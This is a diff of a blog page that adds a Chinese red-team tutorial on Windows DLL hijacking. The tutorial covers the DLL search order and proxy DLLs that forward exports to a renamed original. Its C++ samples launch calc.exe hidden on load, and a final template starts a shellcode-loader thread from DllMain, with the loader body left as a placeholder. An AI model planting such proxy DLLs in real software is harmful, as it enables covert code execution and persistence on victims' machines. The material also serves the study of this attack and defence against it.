@@ -430,9 +430,17 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Redteam/">
+                                <span class="chip bg-color">Redteam</span>
+                            </a>
+                        
+                            <a href="/tags/Bypass/">
+                                <span class="chip bg-color">Bypass</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -453,14 +461,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    663
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -483,7 +491,148 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><pre class="line-numbers language-none"><code class="language-none">DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。
+
+DLL劫持，通过一些手段来劫持或者替换正常的DLL，从而加载编译好的恶意DLL
+
+漏洞成因，调用loadlibrary可使用DLL的相对路径，这是系统会按照特定的顺序搜索一些目录，便于确认DLL的路径，根据官方文档的定义，在使用相对路径调用loadlibrary时，系统会依次从下方6个路径去寻找所需要的DLL
+	程序所在目录	
+	加载 DLL 时所在的当前目录
+	系统目录即SYSTEM32目录
+	16位系统目录即SYSTEM目录
+	Windows目录
+	PATH环境变量中列出的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="基本案例"><a href="#基本案例" class="headerlink" title="基本案例"></a>基本案例</h2><pre class="line-numbers language-none"><code class="language-none">此处需要非常多的一些基础语法知识，此处不进行深入赘述
+
+此处利用转发来实现
+程序A调用aaa.dll中的函数，现将aaa.dll修改为aaa_o.dll，再重新写个aaa.dll将原本的函数转发到aaa_o.dll
+
+dll如下，需要再写个exe去调用这个dll和他的函数
+
+aaa.dll
+
+extern &quot;C&quot; __declspec(dllexport) void test();
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD ul_reason_for_call,
+	LPVOID lpReserved)
+
+&#123;
+	switch (ul_reason_for_call)
+	&#123;
+	case DLL_PROCESS_ATTACH:
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	&#125;
+	return TRUE;
+&#125;
+
+void test() &#123;
+	MessageBox(NULL, L&quot;aaa.dll success&quot;, L&quot;s&quot;, 0); 
+&#125;
+
+调用成功效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="pic/1.png" alt="1"></p>
+<pre class="line-numbers language-none"><code class="language-none">再看下导出函数，确认test导出函数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="pic/2.png" alt="2"></p>
+<pre class="line-numbers language-none"><code class="language-none">新的dll
+
+extern &quot;C&quot; __declspec(dllexport) void test();
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD ul_reason_for_call,
+	LPVOID lpReserved)
+
+&#123;
+	switch (ul_reason_for_call)
+	&#123;
+	case DLL_PROCESS_ATTACH:
+		WinExec(&quot;calc.exe&quot;, SW_HIDE); 
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	&#125;
+	return TRUE;
+&#125;
+
+void test() &#123;
+	MessageBox(NULL, L&quot;SUCCESS&quot;, L&quot;SSSSS&quot;, 0); 
+	HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa_o.dll&quot;);
+	if (hDllInst) &#123;
+		typedef DWORD(WINAPI *EXPFUNC)();
+		EXPFUNC exportFunc &#x3D; NULL;
+		exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);
+		if (exportFunc) &#123;
+			exportFunc();
+		&#125;
+		FreeLibrary(hDllInst);
+	&#125;
+	return;
+&#125;
+
+劫持后效果如下
+
+与这里不同的方式可使用预编译，更加快捷
+#pragma comment(linker, &quot;&#x2F;EXPORT:&lt;Function name&gt;&#x3D;&lt;Dll name&gt;.&lt;Function name&gt;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="pic/3.png" alt="3"></p>
+<pre class="line-numbers language-none"><code class="language-none">上线利用：
+
+extern &quot;C&quot; __declspec(dllexport) void test();
+
+DWORD WINAPI DoSC(LPVOID lpParameter)
+&#123;
+	这里其实和写加载器一样
+&#125;
+
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+&#123;
+	switch (ul_reason_for_call)
+	&#123;
+	case DLL_PROCESS_ATTACH:
+		HANDLE threadHandle;
+		threadHandle &#x3D; CreateThread(NULL, 0, DoSC, NULL, 0, NULL);
+		break;
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	&#125;
+	return TRUE;
+&#125;
+
+void test()
+&#123;
+	MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, 0);
+	HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa.dll&quot;);
+	if (hDllInst)
+	&#123;
+		typedef DWORD(WINAPI *EXPFUNC)();
+		EXPFUNC exportFunc &#x3D; NULL;
+		exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);
+		if (exportFunc)
+		&#123;
+			exportFunc();
+		&#125;
+		FreeLibrary(hDllInst);
+	&#125;
+	return;
+&#125;
+
+最终效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="pic/4.png" alt="4"></p>
+
                 
             </div>
             <hr/>
@@ -546,7 +695,15 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/Redteam/">
+                                    <span class="chip bg-color">Redteam</span>
+                                </a>
+                            
+                                <a href="/tags/Bypass/">
+                                    <span class="chip bg-color">Bypass</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -623,6 +780,18 @@
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Redteam/">
+                        <span class="chip bg-color">Redteam</span>
+                    </a>
+                    
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -896,7 +1065,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">87</span>&nbsp;字
+                class="white-color">750</span>&nbsp;字
             
             
             
